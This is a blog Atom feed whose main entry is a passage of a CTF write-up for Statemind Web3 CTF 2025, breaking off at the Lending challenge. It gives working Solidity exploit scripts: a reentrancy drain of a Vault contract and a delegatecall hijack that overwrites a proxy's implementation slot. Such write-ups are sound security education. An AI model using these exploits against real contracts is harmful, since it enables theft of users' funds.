<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <title>Charan Nomula</title>
    <subtitle>Known as TheMj0ln1r</subtitle>
    <link rel="self" type="application/atom+xml" href="https://themj0ln1r.github.io/atom.xml"/>
    <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/"/>
    <generator uri="https://www.getzola.org/">Zola</generator>
    <updated>2025-01-15T00:00:00+00:00</updated>
    <id>https://themj0ln1r.github.io/atom.xml</id>
    <entry xml:lang="en">
        <title>Learn Huff by solving a CTF challenge</title>
        <published>2025-01-15T00:00:00+00:00</published>
        <updated>2025-01-15T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/posts/learn-huff-with-ctf/"/>
        <id>https://themj0ln1r.github.io/posts/learn-huff-with-ctf/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/posts/learn-huff-with-ctf/">&lt;p&gt;Typing.......&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Statemind Web3 CTF 2025</title>
        <published>2025-01-14T00:00:00+00:00</published>
        <updated>2025-01-14T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/statemindctf25/"/>
        <id>https://themj0ln1r.github.io/writeups/statemindctf25/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/statemindctf25/">&lt;p&gt;Alpha content here... To keep up my security review skills, I participated in Statemind web3 security fellowship CTF focused on smart contract security of various concepts like,&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;DeFi protocol vulnerabilities&lt;&#x2F;li&gt;
&lt;li&gt;Cross-chain bridge security&lt;&#x2F;li&gt;
&lt;li&gt;Oracle manipulation&lt;&#x2F;li&gt;
&lt;li&gt;Cryptographic implementations&lt;&#x2F;li&gt;
&lt;li&gt;Solidity and Vyper smart contracts&lt;&#x2F;li&gt;
&lt;li&gt;Huff programming&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;I&#x27;m super excited to share my solutions and insights from this CTF, where I managed to secure a spot in the top 3! üèÜ Get ready for detailed writeups of each challenge - trust me, you won&#x27;t want to miss these!&lt;&#x2F;p&gt;
&lt;p&gt;All of these challenges with solutions can be found here : &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;statemind-web3-ctf&quot;&gt;TheMj0ln1r&#x2F;statemind-web3-ctf&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;vault&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#vault&quot; aria-label=&quot;Anchor link for: vault&quot;&gt;Vault&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;P: &quot;Your goal is to drain all ether from the Vault contract. Use the deposit and withdraw functions to reduce the vault&#x27;s balance to zero. Once the isSolved function returns true, you&#x27;ve completed the challenge.&quot;&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Vault.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;soliidty&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-soliidty &quot;&gt;&lt;code class=&quot;language-soliidty&quot; data-lang=&quot;soliidty&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.6.12;
&lt;&#x2F;span&gt;&lt;span&gt;pragma experimental ABIEncoderV2;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Vault {
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; uint256) public balances;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _player) public payable {
&lt;&#x2F;span&gt;&lt;span&gt;        player = _player;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function deposit(address _to) public payable {
&lt;&#x2F;span&gt;&lt;span&gt;        balances[_to] += msg.value;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function withdraw(uint256 _amount) public {
&lt;&#x2F;span&gt;&lt;span&gt;        if (balances[msg.sender] &amp;gt;= _amount) {
&lt;&#x2F;span&gt;&lt;span&gt;            (bool success,) = msg.sender.call{value: _amount}(&amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;            require(success, &amp;quot;call failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;            balances[msg.sender] -= _amount;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function balanceOf(address _who) public view returns (uint256 balance) {
&lt;&#x2F;span&gt;&lt;span&gt;        return balances[_who];
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() external view returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        return address(this).balance == 0;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;solution&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution&quot; aria-label=&quot;Anchor link for: solution&quot;&gt;solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The vulnerability in this contract lies in the &lt;code&gt;withdraw&lt;&#x2F;code&gt; function, which is susceptible to a reentrancy attack. Here&#x27;s why:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;The contract follows the checks-effects-interactions pattern incorrectly&lt;&#x2F;li&gt;
&lt;li&gt;The balance is updated after the external call&lt;&#x2F;li&gt;
&lt;li&gt;The contract uses a low-level &lt;code&gt;call&lt;&#x2F;code&gt; which forwards all gas&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Here&#x27;s how I exploited it:&lt;&#x2F;p&gt;
&lt;p&gt;The exploit script uses a malicious contract (&lt;code&gt;Attack&lt;&#x2F;code&gt;) that implements a &lt;code&gt;receive()&lt;&#x2F;code&gt; function to recursively withdraw funds from the vault. When the vault sends ETH to our contract, the &lt;code&gt;receive()&lt;&#x2F;code&gt; function is triggered, allowing us to withdraw more funds before the vault updates its balance.&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Vault.s.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.6.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Vault} from &amp;quot;..&#x2F;src&#x2F;Vault.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract VaultSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Vault public vault = Vault(0x1B3C95A210A8C896b1C14D992600087668cd0174);
&lt;&#x2F;span&gt;&lt;span&gt;    address player = vm.envAddress(&amp;quot;PLAYER&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function run() external{
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Vault : &amp;quot;, address(vault));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Vault balance: &amp;quot;, address(vault).balance);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player : &amp;quot;, player);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance: &amp;quot;, player.balance);
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack = new Attack(address(vault));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Attack balance: &amp;quot;, address(attack).balance);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        attack.exploit{value: 0.001 ether}();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Vault balance: &amp;quot;, address(vault).balance);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Attack balance: &amp;quot;, address(attack).balance);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance: &amp;quot;, player.balance);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    Vault public vault;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _vault) public {
&lt;&#x2F;span&gt;&lt;span&gt;        vault = Vault(_vault);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function exploit() public payable{
&lt;&#x2F;span&gt;&lt;span&gt;        vault.deposit{value: msg.value}(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;        vault.withdraw(0.001 ether);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; I need my testnet tokens back
&lt;&#x2F;span&gt;&lt;span&gt;        msg.sender.call{value : address(this).balance}(&amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    receive() payable external{
&lt;&#x2F;span&gt;&lt;span&gt;        if (address(vault).balance &amp;gt;= 0.001 ether){
&lt;&#x2F;span&gt;&lt;span&gt;            vault.withdraw(0.001 ether);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;proxy&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#proxy&quot; aria-label=&quot;Anchor link for: proxy&quot;&gt;Proxy&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;P: &quot;You&#x27;ve encountered a proxy contract setup where the Proxy delegates calls to an Executor implementation. Find a way to manipulate the logic and get isSolved to return true.&quot;&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Proxy.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;utils&#x2F;Address.sol&amp;quot;; 
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;proxy&#x2F;utils&#x2F;Initializable.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Proxy {
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; bytes32(uint256(keccak256(&amp;quot;eip1967.proxy.implementation&amp;quot;)) - 1)
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    struct AddressSlot {
&lt;&#x2F;span&gt;&lt;span&gt;        address value;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _logic, address _player) {
&lt;&#x2F;span&gt;&lt;span&gt;        require(Address.isContract(_logic), &amp;quot;implementation_not_contract&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success,) = _logic.delegatecall(
&lt;&#x2F;span&gt;&lt;span&gt;            abi.encodeWithSignature(&amp;quot;initialize(address)&amp;quot;, _player)
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(success, &amp;quot;call_failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function _delegate(address implementation) internal virtual {
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; solhint-disable-next-line no-inline-assembly
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            calldatacopy(0, 0, calldatasize())
&lt;&#x2F;span&gt;&lt;span&gt;            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
&lt;&#x2F;span&gt;&lt;span&gt;            returndatacopy(0, 0, returndatasize())
&lt;&#x2F;span&gt;&lt;span&gt;            switch result
&lt;&#x2F;span&gt;&lt;span&gt;            case 0 { revert(0, returndatasize()) }
&lt;&#x2F;span&gt;&lt;span&gt;            default { return(0, returndatasize()) }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; proxy fallback
&lt;&#x2F;span&gt;&lt;span&gt;    fallback() external payable virtual {
&lt;&#x2F;span&gt;&lt;span&gt;        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            r.slot := slot
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;contract Executor is Initializable {
&lt;&#x2F;span&gt;&lt;span&gt;    address public owner;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function initialize(address _player) external initializer {
&lt;&#x2F;span&gt;&lt;span&gt;        owner = msg.sender;
&lt;&#x2F;span&gt;&lt;span&gt;        player = _player;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    modifier onlyOwner {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == owner, &amp;quot;not_owner&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function execute(address logic) external payable {
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success,) = logic.delegatecall(abi.encodeWithSignature(&amp;quot;exec()&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;        require(success, &amp;quot;call_fail&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() external pure returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        return false;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;solution-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-1&quot; aria-label=&quot;Anchor link for: solution-1&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Okay, we got one vulnerable proxy implementation. This is a &lt;code&gt;delegatecall&lt;&#x2F;code&gt; based proxy pattern in which the Proxy contract holding the storage and logic is present in the Executor contract.&lt;&#x2F;p&gt;
&lt;p&gt;The goal is to manipulate the logic to make &lt;code&gt;isSolved()&lt;&#x2F;code&gt; return true. But If we observe that &lt;code&gt;isSolved()&lt;&#x2F;code&gt; function, it always returns &lt;code&gt;false&lt;&#x2F;code&gt; and it is hardcoded in the contract. So, that means we need to do complete upgrade of that contract and re-deploy in such a that it returns &lt;code&gt;true&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The key vulnerability lies in the &lt;code&gt;execute()&lt;&#x2F;code&gt; function which uses &lt;code&gt;delegatecall&lt;&#x2F;code&gt; to execute arbitrary logic, allowing us to potentially manipulate the contract&#x27;s state. Simply, the calls to Proxy contract is delegated to the Executor and the Executor is delegating to the &lt;code&gt;exec()&lt;&#x2F;code&gt; function of a arbitray Logic contract. So the context of the call (&lt;code&gt;msg.sender&lt;&#x2F;code&gt;, &lt;code&gt;msg.value&lt;&#x2F;code&gt;, &lt;code&gt;this&lt;&#x2F;code&gt; and storage) remains same inside the &lt;code&gt;exec()&lt;&#x2F;code&gt; function on Logic. So, If we can update the Executor address in the Proxy slot to a new contract which have the logic of returning &lt;code&gt;true&lt;&#x2F;code&gt; on calling &lt;code&gt;isSolved()&lt;&#x2F;code&gt; then the chall is done. This is what I did in the following exploit script.&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Proxy.s.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Proxy, Executor} from &amp;quot;..&#x2F;src&#x2F;Proxy.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;proxy&#x2F;utils&#x2F;Initializable.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract ProxySolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Proxy public proxy = Proxy(payable(0x09FAb0F0CC143875873F111A27DF77B6ade37a20));
&lt;&#x2F;span&gt;&lt;span&gt;    Executor public executor = Executor(address(proxy));
&lt;&#x2F;span&gt;&lt;span&gt;    address player = vm.envAddress(&amp;quot;PLAYER&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; Deploy
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; function setUp() external{
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F;     executor = new Executor();
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F;     proxy = new Proxy(address(executor), player);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F;     executor = Executor(address(proxy));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F;     vm.deal(player, 1 ether);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; }
&lt;&#x2F;span&gt;&lt;span&gt;    function run() external{
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Proxy : &amp;quot;, address(proxy));
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 logic = vm.load(address(proxy), bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;logic in Proxy&amp;quot;, address(uint160(uint256(logic))));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Proxy Owner: &amp;quot;, executor.owner());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player in Proxy: &amp;quot;, executor.player());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player : &amp;quot;, player);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance: &amp;quot;, player.balance);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;isSolved(): &amp;quot;, executor.isSolved());
&lt;&#x2F;span&gt;&lt;span&gt;        NewExecutor newExecutor = new NewExecutor();
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack = new Attack(address(address(newExecutor)), player);
&lt;&#x2F;span&gt;&lt;span&gt;        executor.execute(address(attack));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Attack : &amp;quot;, address(attack));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;NewExecutor : &amp;quot;, address(newExecutor));
&lt;&#x2F;span&gt;&lt;span&gt;        logic = vm.load(address(proxy), bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;logic in Proxy&amp;quot;, address(uint160(uint256(logic))));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; executor.initialize(player);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Proxy Owner: &amp;quot;, executor.owner());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player in Proxy: &amp;quot;, executor.player());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;isSolved(): &amp;quot;, executor.isSolved());
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack {
&lt;&#x2F;span&gt;&lt;span&gt;    struct AddressSlot {
&lt;&#x2F;span&gt;&lt;span&gt;        address value;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    address public owner;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player;
&lt;&#x2F;span&gt;&lt;span&gt;    address immutable newExecutor;
&lt;&#x2F;span&gt;&lt;span&gt;    address immutable playerplayer;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _newExecutor, address _player){
&lt;&#x2F;span&gt;&lt;span&gt;        newExecutor = _newExecutor;
&lt;&#x2F;span&gt;&lt;span&gt;        playerplayer = _player;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function exec() external {
&lt;&#x2F;span&gt;&lt;span&gt;        owner = address(0xdeadbeef);
&lt;&#x2F;span&gt;&lt;span&gt;        player = playerplayer;
&lt;&#x2F;span&gt;&lt;span&gt;        _getAddressSlot(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc).value = newExecutor;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            r.slot := slot
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract NewExecutor is Initializable{
&lt;&#x2F;span&gt;&lt;span&gt;    address public owner;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player;
&lt;&#x2F;span&gt;&lt;span&gt;    function initialize(address _player) external initializer {
&lt;&#x2F;span&gt;&lt;span&gt;        owner = msg.sender;
&lt;&#x2F;span&gt;&lt;span&gt;        player = _player;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() external pure returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        return true;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;lending&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#lending&quot; aria-label=&quot;Anchor link for: lending&quot;&gt;Lending&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;P: &quot;You have lending protocol that interacts with interesting pair. You need to steal all funds from lending protocol.&quot;&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Lending.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin&#x2F;contracts&#x2F;utils&#x2F;math&#x2F;Math.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;helpers&#x2F;ERC20.sol&amp;quot;;
